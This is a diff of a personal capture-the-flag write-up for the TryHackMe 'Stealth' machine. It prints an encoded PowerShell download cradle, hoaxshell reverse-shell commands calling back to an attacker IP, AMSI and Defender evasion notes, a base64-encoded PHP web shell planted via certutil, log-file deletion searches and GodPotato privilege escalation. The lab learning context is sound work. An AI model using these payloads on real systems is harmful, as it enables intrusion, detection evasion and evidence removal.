@@ -1,4 +1,4 @@
-# Stealth Writeup
+# Stealth Helped-Through
 
 Name: Stealth
 Date:  
@@ -12,7 +12,7 @@ Beyond Root:
 - [[Stealth-Notes.md]]
 - [[Stealth-CMD-by-CMDs.md]]
 
-I peaked too much at [Tyler Ramsbey's Stealth - Detailed Walkthrough -- [TryHackMe LIVE!]](https://www.youtube.com/watch?v=iICjs8754yE)
+I peaked too much at [Tyler Ramsbey's Stealth - Detailed Walkthrough -- TryHackMe LIVE!](https://www.youtube.com/watch?v=iICjs8754yE) - I eventual to finish this machine a mine the good information I found and learnt.
 ## Recon of machine and alternatives
 
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
@@ -112,10 +112,8 @@ wsgidav --port=80 --host=10.11.3.193 --root=$(pwd) --auth=anonymous
 ```
 Or
 ```bash
-# Pipe out to a file do not just do want the nice women wrote down like an idiot
+# Pipe out to a file do not just do what the nice women wrote down like an idiot
 nc -lvnp 80
-
-i
 ```
 [Discovered CSbyGB - Woman Hacker of the Year 2022's notes](https://csbygb.gitbook.io/pentips/cs-by-gb-pentips/readme) 
 
@@ -192,7 +190,7 @@ See info.txt for more.
 
 ![](patt-startinghereforamsibypasses.png)
 
-The play being that once successful bypassing AMSI I then I may have to execute in memory as there may be a nasty custom script to re-enable or restart AMSI every couple of minutes as AMSI can be unhooked, reflected state to itself, etc. 
+The play being that once successful bypassing AMSI I may then have to execute in memory as there may be some nasty custom script to re-enable or restart AMSI every couple of minutes as AMSI can be unhooked, reflected state to itself, etc. 
 
 From early adding a chunking and recombining into a big base64 blob 
 ```bash
@@ -203,6 +201,7 @@ powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXA
 
 ```
 
+Call back..
 ![](wehavehit.png)
 
 ```bash
@@ -218,10 +217,10 @@ powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXA
 
 *As of 2022-10-18, hoaxshell is detected by AMSI ([malware-encyclopedia](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=VirTool%3aPowerShell%2fXoashell.A&threatid=2147833654)). You need to obfuscate the generated payload in order to use. Check out this video on how to obfuscate manually and bypass MS Defender:*
 
-```
+```bash
 git clone https://github.com/t3l3machus/hoaxshell
 cd ./hoaxshell
-sudo pip3 install -r requirements.txt
+pip3 install -r requirements.txt
 chmod +x hoaxshell.py
 
 python3 hoaxshell.py -s 10.11.3.193 -p 8443 -i -H "Authorization" -x "C:\programdata\update.ps1"
@@ -234,7 +233,6 @@ It did not work, obfuscation time.
 
 ```powershell
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes())
-
 
 
 $gohere=[System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String('MQAwAC4AMQAxAC4AMwAuADEAOQAzADoAOAA0ADQAMwA='))
@@ -259,7 +257,54 @@ I peaked at the walkthrough just to get this done. Its been 4 hours and I need t
 - webshell 
 - godpotato - never heard of this.
 
+## Return months later...
 
+While skimming though through my notes and what I had written up to this point I rediscovered to priority to finish this machine as I got a lot out regardless on getting a flag after the foothold. I decided to background [Tyler Ramsbey's Stealth - Detailed Walkthrough -- TryHackMe LIVE!](https://www.youtube.com/watch?v=iICjs8754yE) while to reacquaint as I put in the 4+ hours, learnt a lot and got a foothold, but I need to wrap this up and move forward. Also [breakfast](https://www.youtube.com/watch?v=ZDiltBbhnYI) and everything else I have to do. Tyler also mentioned that [dodge box](https://tryhackme.com/room/dodge) exists, which I did not know I added it to a list of next boxes to finish after all the incomplete boxes I need to finish. In my frustration to complete this after so much steps forward and back I did not realise I had to delete log files.
+
+Tyler got told by chat to use [gh0x0st/Get-ReverseShell](https://github.com/gh0x0st/Get-ReverseShell/tree/main)
+- https://github.com/gh0x0st 
+![](thxrtristram.png)
+
+Tristam seems like someone to follow and emulate!
+![](hurrayfortristram.png)
+
+
+
+```
+Get-ChildItem -Path C:\user\evader -Include log.txt,*.log -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\xampp -Include log.txt,*.log -File -Recurse -ErrorAction SilentlyContinue
+```
+
+I then I had a large breakthrough in thinking while skipping thorough the video and wondering why he is using GodPotato to get NT SYSTEM. The answer being that Tyler added a web shell because the webserver has it is own privileges and this is a twist on the typical webserver user to user and is the inverse.
+
+```bash
+iconv -f ASCII -t UTF-16LE sente.php | base64 | tr -d "\n"
+PAA/AHAAaABwACAAaQBmACgAaQBzAHMAZQB0ACgAJABfAFIARQBRAFUARQBTAFQAWwAnAGMAbQBkACcAXQApACkAewAgAGUAYwBoAG8AIAAiADwAcAByAGUAPgAiADsAIAAkAGMAbQBkACAAPQAgACgAJABfAFIARQBRAFUARQBTAFQAWwAnAGMAbQBkACcAXQApADsAIABzAHkAcwB0AGUAbQAoACQAYwBtAGQAKQA7ACAAZQBjAGgAbwAgACIAPAAvAHAAcgBlAD4AIgA7ACAAZABpAGUAOwAgAH0APwA+AAoA > sentebe64.ps1
+```
+
+- https://gist.github.com/sente/4dbb2b7bdda2647ba80b
+
+Upload this
+```powershell
+certutil.exe -decode senteb64.ps1 C:\xampp\htdocs\shell.php
+```
+
+![](webnshellonthebox.png)
+This did not work...
+
+For some reason typical LOLBAS do not work, but there is wget on the machine...same of the shell
+![](godpotatowithwget.png)
+
+Potential this is just because of UAC? It is the same SID as the shell
+![](weirdlydifferent.png)
+
+
+![](SYSTEM.png)
+
+![](workedbutdidnotwork.png)
+And NT flag
+![](root.png)
 ## Post-Root-Reflection  
 
 - Hoaxshell can work with
@@ -268,6 +313,6 @@ I peaked at the walkthrough just to get this done. Its been 4 hours and I need t
 
 ## Beyond Root
 
-- Use Hoaxshell!
-
-
+- Use Hoaxshell! I did not work! Even with Chimera!
+- https://github.com/gh0x0st/Secure_Kali
+- https://github.com/BeichenDream/GodPotato to the Archive!
